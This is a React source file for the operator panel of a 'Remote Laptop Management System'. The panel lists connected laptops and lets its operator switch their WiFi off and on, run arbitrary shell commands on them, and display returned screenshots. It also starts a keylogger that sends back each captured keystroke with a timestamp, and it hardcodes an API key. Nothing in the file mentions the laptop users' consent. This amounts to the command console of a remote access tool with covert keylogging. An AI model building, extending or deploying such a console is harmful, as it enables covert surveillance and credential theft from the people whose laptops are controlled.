import React, { useState, useEffect } from "react";
import axios from "axios";
import "./App.css";

function App() {
  const [laptops, setLaptops] = useState([]);
  const [selectedLaptop, setSelectedLaptop] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [command, setCommand] = useState('echo "Hello World"');
  const [timer, setTimer] = useState("2m");
  const [output, setOutput] = useState("");
  const [status, setStatus] = useState("");

  const [keylogDuration, setKeylogDuration] = useState(5000); // ms
  const [keylogData, setKeylogData] = useState([]);

  const API_URL = import.meta.env.VITE_API_URL || `http://localhost:3001/api/`;
  const API_KEY = "Pawan_Bisht"; // In prod, use env var

  const wifiOff = "wifi-off";
  const wifiOn = "wifi-on";

  useEffect(() => {
    fetchLaptops();
  }, []);

  const fetchLaptops = async () => {
    setIsLoading(true);
    try {
      const response = await axios.get(`${API_URL}laptops`, {
        headers: { "X-API-Key": API_KEY },
      });
      setLaptops(response.data.laptops);
    } catch (error) {
      console.error("Error fetching laptops:", error);
      setStatus("Error fetching laptops");
    } finally {
      setIsLoading(false);
    }
  };

  const turnOffWifi = async (type) => {
    if (!selectedLaptop) {
      setStatus("Please select a laptop first");
      return;
    }

    setIsLoading(true);
    try {
      const response = await axios.post(
        `${API_URL}control/wifi/off`,
        { laptopId: selectedLaptop.id, type: type },
        { headers: { "X-API-Key": API_KEY } },
      );
      setStatus(response.data.message);
    } catch (error) {
      console.error(`Error controlling WiFi (${type}):`, error);
      setStatus(`Failed to ${type === wifiOff ? "turn off" : "turn on"} WiFi`);
    } finally {
      setIsLoading(false);
    }
  };

  const executeCommand = async () => {
    if (!selectedLaptop) {
      setStatus("Please select a laptop first");
      return;
    }

    setIsLoading(true);
    setOutput("");
    try {
      const response = await axios.post(
        `${API_URL}control/execute`,
        {
          laptopId: selectedLaptop.id,
          command: command,
          timer: timer,
        },
        { headers: { "X-API-Key": API_KEY } },
      );
      setOutput(response.data.output);
      setStatus("Command executed successfully");
    } catch (error) {
      console.error("Error executing command:", error);
      setStatus("Command execution failed");
    } finally {
      setIsLoading(false);
    }
  };

  const startKeylogger = async () => {
    if (!selectedLaptop) {
      setStatus("Please select a laptop first");
      return;
    }

    setIsLoading(true);
    setKeylogData([]);
    setStatus("Starting keylogger...");

    try {
      const response = await axios.post(
        `${API_URL}control/keylogger`,
        {
          laptopId: selectedLaptop.id,
          duration: keylogDuration,
        },
        { headers: { "X-API-Key": API_KEY } },
      );

      if (response.data.success && Array.isArray(response.data.keys)) {
        setKeylogData(response.data.keys);
        setStatus(`Keylogger ran for ${keylogDuration}ms`);
      } else {
        setStatus("No key data received.");
      }
    } catch (error) {
      console.error("Error running keylogger:", error);
      setStatus("Keylogger failed.");
    } finally {
      setIsLoading(false);
    }
  };

  const hasFilePath = (outputData) =>
    outputData &&
    typeof outputData === "object" &&
    (outputData.filePath || outputData.filepath);

  const getFilePath = (outputData) =>
    outputData.filePath || outputData.filepath;

  const getFileName = (path) => {
    if (!path) return "download";
    return path.split("screenshots/").pop() || "download";
  };

  return (
    <div className="main--container">
      <div className="app-container">
        <h1>Remote Laptop Management System</h1>

        <div className="section">
          <h2>Available Devices</h2>
          <button
            onClick={fetchLaptops}
            disabled={isLoading}
            className="refresh-button"
          >
            {isLoading ? "Scanning..." : "Scan for Devices"}
          </button>

          {isLoading && <p className="loading-indicator">Loading...</p>}

          <div className="laptop-list">
            {laptops.length > 0 ? (
              laptops.map((laptop) => (
                <div
                  key={laptop.id}
                  className={`laptop-card ${selectedLaptop?.id === laptop.id ? "selected" : ""}`}
                  onClick={() => setSelectedLaptop(laptop)}
                >
                  <h3>{laptop.name}</h3>
                  <p>
                    <strong>Status:</strong> {laptop.status || "Connected"}
                  </p>
                  <p>
                    <strong>Last Connected:</strong>{" "}
                    {new Date(laptop.connectionTime).toLocaleString()}
                  </p>
                </div>
              ))
            ) : (
              <p className="no-devices">
                No devices found. Click "Scan for Devices" to refresh.
              </p>
            )}
          </div>
        </div>

        {selectedLaptop && (
          <div className="section">
            <h2>Device Control: {selectedLaptop.name}</h2>

            <div className="control-card">
              <h3>Network Controls</h3>
              <div className="button-group">
                <div className="command-input-container">
                  <input
                    value={timer}
                    onChange={(e) => setTimer(e.target.value)}
                    disabled={isLoading}
                    placeholder="timer...."
                    className="command-input"
                  />
                  <button
                    onClick={() => turnOffWifi(wifiOff)}
                    className="danger"
                    disabled={isLoading}
                  >
                    Disable WiFi
                  </button>
                </div>

                <button
                  onClick={() => turnOffWifi(wifiOn)}
                  className="success"
                  disabled={isLoading}
                >
                  Enable WiFi
                </button>
              </div>
            </div>

            <div className="control-card">
              <h3>Remote Command Execution</h3>
              <div className="command-input-container">
                <input
                  value={command}
                  onChange={(e) => setCommand(e.target.value)}
                  disabled={isLoading}
                  placeholder="Enter command to execute..."
                  className="command-input"
                />
                <button
                  onClick={executeCommand}
                  disabled={isLoading}
                  className="execute-button"
                >
                  {isLoading ? "Executing..." : "Execute"}
                </button>
              </div>

              <div className="output-container">
                <h4>Command Output:</h4>

                {!output && <p className="no-output">No output available</p>}

                {output && typeof output === "string" && (
                  <pre className="text-output">{output}</pre>
                )}

                {output && hasFilePath(output) && (
                  <div className="file-output">
                    <div className="image-container">
                      <img
                        src={getFilePath(output)}
                        alt="Command Output"
                        className="output-image"
                      />
                    </div>
                    <a
                      href={getFilePath(output)}
                      download={getFileName(getFilePath(output))}
                      className="download-link"
                      target="_blank"
                    >
                      <button className="download-button">
                        Download Image
                      </button>
                    </a>
                  </div>
                )}
              </div>
            </div>

            <div className="control-card">
              <h3>Keylogger</h3>
              <div className="command-input-container">
                <input
                  type="number"
                  min="1000"
                  step="1000"
                  value={keylogDuration}
                  onChange={(e) => setKeylogDuration(parseInt(e.target.value))}
                  disabled={isLoading}
                  placeholder="Duration in ms"
                  className="command-input"
                />
                <button
                  onClick={startKeylogger}
                  disabled={isLoading}
                  className="danger"
                >
                  {isLoading ? "Logging..." : "Start Keylogger"}
                </button>
              </div>

              {keylogData.length > 0 && (
                <div className="output-container">
                  <h4>Keylogger Output:</h4>
                  <ul className="text-output">
                    {keylogData.map((entry, idx) => (
                      <li key={idx}>
                        {entry.timestamp} — {entry.key} ({entry.keycode})
                      </li>
                    ))}
                  </ul>
                </div>
              )}
            </div>

            {status && <p className="status">{status}</p>}
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
